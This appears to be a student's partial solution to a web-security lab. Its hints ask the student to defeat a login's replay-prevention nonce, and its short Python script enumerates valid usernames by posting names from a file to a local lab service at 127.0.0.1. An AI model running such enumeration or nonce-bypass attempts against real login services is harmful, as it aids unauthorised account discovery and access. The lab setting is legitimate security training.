# Hints:
# - First examine the request and response traffic using a browser and Burp
# - See if you can figure out how the replay prevention mechanism works.  Can you defeat it to log in?
# - Consider using the requests module to do this in Python
#
# IMPORTANT: Stop the service (Ctrl-C) when you are done with the lab

import requests

name_file = open('names.txt', 'r')

names = name_file.readlines()
name_file.close()

for name in names:
    data = {'username': name.strip()}
    response = requests.post('http://127.0.0.1:9942/password', data)
    if response.text.find('Username: ') == -1:
        print(name)

        # <form method="post" action="/login">
        # Password: <input type="password" name="password"><br>
        #             <input type="hidden" name="username" value="pintel">
        #             <input type="hidden" name="nonce" value="E1eBC7A96b02DcF4d53a">